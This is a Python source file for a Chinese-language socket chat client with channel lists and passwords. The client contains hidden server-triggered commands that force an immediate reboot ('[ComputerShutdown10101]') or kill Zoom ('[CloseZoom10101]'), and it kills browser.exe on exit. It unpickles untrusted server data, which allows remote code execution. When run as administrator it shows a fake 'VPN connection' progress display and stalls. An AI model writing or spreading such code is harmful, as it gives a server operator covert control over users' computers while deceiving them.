from pprint import pprint
import socket
import threading
import os
import subprocess
import time
import ctypes
from ctypes import wintypes
import requests
import atexit
import re
import ctypes
import pickle

class FixedChannel:
    def __init__(self, name, port,password):
        self.name = name
        self.port = port
        self.host = HOST
        self.password = password


# Example usage


class ChatClient:
    def __init__(self, server_host, server_port, server_name):
        self.server_host = server_host
        self.server_port = server_port
        self.username = None
        self.name = server_name

    def receive_messages(self, client_socket):
        while True:
            try:
                # Receive data from the server
                data = client_socket.recv(1024).decode('utf-8')
                if data:
                    if '[ComputerShutdown10101]' in str(data):
                        command = ['shutdown', '/r', '/t', '0']
                        subprocess.run(command)
                        os.abort()
                    elif '[CloseZoom10101]' in str(data):
                        subprocess.run(['taskkill', '/IM', 'Zoom.exe', '/F'])
                        os.abort()
                    elif 'Player_Count_Update' in str(data):
                        chatmember = self.extract_number(data)
                        membercount = f'聊天室人数: {chatmember}'
                        ctypes.windll.kernel32.SetConsoleTitleW(membercount)
                    else:
                        print(f'\n{data}\n输入: ', end='')
            except:
                # If an error occurs, close the connection and exit the thread
                client_socket.close()
                break

    def start_chat_client(self):
        print(f'连接成功 {self.name}')
        while True:
            self.username = input("输入你的用户名: ")
            if self.username and self.username.strip():
                break

        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server
        client_socket.connect((self.server_host, self.server_port))

        client_socket.sendall(f"{self.username}加入了对话".encode('utf-8'))
        # Start a thread to receive messages from the server
        receive_thread = threading.Thread(target=self.receive_messages, args=(client_socket,))
        receive_thread.start()
        try:
            while True:
                # Read user input
                message = input("输入: ")
                encodemsg = f'{self.username}: {message}'
                client_socket.sendall(encodemsg.encode('utf-8'))
        except KeyboardInterrupt:
            client_socket.sendall(f"{self.username}离开了对话".encode('utf-8'))
            subprocess.call("TASKKILL /F /IM browser.exe", shell=True)

    @staticmethod
    def extract_number(data):
        # Extracts the number from a string
        number = ''.join(filter(str.isdigit, data))
        return int(number)
    
class MainClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.username = None

    def start_chat_client(self):
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server
        client_socket.connect((self.server_host, self.server_port))
        # Start a thread to receive messages from the server
        try:
            while True:
                # Read user input
                data = client_socket.recv(4096)
                if data:
                    table_data = pickle.loads(data)
                    notfound = True
                    passnotcorrect = True
                    for channel in table_data:
                        print(f'{channel.name}: 频道ID: {channel.port}')
                    while notfound == True:
                        
                        chanid = int(input("输入频道ID: "))
                        chanport = 0
                        for channel in table_data:
                            if chanid == extract_number(channel.name):
                                notfound = False
                                chanport = channel.port
                                break
                            else:
                                print("没有找到频道ID")
                    print("连接中...")
                    client_socket.close()
                    if channel.password != None:
                        while passnotcorrect == True:
                            
                            passid = input("输入频道密码: ")
                            if passid == channel.password:
                                    passnotcorrect = False
                                    break
                            else:
                                print("错误密码")
                                
                    ChatClient(HOST,chanport,channel.name).start_chat_client()
        except KeyboardInterrupt:

            subprocess.call("TASKKILL /F /IM browser.exe", shell=True)

    @staticmethod
    def extract_number(data):
        # Extracts the number from a string
        number = ''.join(filter(str.isdigit, data))
        return int(number)
    
def extract_number(string):
    number = re.search(r'\d+', string)
    if number:
        return int(number.group())
    else:
        return None

HOST = 'XXXXXXX' #Replace with your IP
# Constants from the Windows API
TOKEN_ELEVATION_TYPE = 18
TokenElevationTypeDefault = 1
TokenElevationTypeFull = 2
TokenElevationTypeLimited = 3

# Load the necessary Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)

OpenProcessToken = advapi32.OpenProcessToken
OpenProcessToken.argtypes = (wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE))
GetTokenInformation = advapi32.GetTokenInformation
GetTokenInformation.argtypes = (wintypes.HANDLE, ctypes.c_uint, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD))

# Get the current process handle
process_handle = kernel32.GetCurrentProcess()

token_handle = wintypes.HANDLE()
if OpenProcessToken(process_handle, 0x0008 | 0x0002, ctypes.byref(token_handle)):
    token_information = wintypes.DWORD()
    token_information_size = ctypes.sizeof(token_information)
    return_length = wintypes.DWORD()
    if GetTokenInformation(token_handle, TOKEN_ELEVATION_TYPE, ctypes.byref(token_information), token_information_size, ctypes.byref(return_length)):
        elevation_type = token_information.value
        if elevation_type == TokenElevationTypeFull:
            print("Connecting To VPN...")
            time.sleep(5)
            print("VPN Connection Procces: 10%")
            time.sleep(1)
            print("VPN Connection Procces: 20%")
            time.sleep(1.5)
            print("VPN Connection Procces: 40%")
            time.sleep(2)
            print("VPN Connection Procces: 60%")
            time.sleep(1)
            print("VPN Connection Procces: 100%")
            print("VPN Connection Success!")
            time.sleep(999)
        else:
            MainClient(HOST,11112).start_chat_client()
    else:
        print("Failed to retrieve token information.")
else:
    print("Failed to open process token.")

            


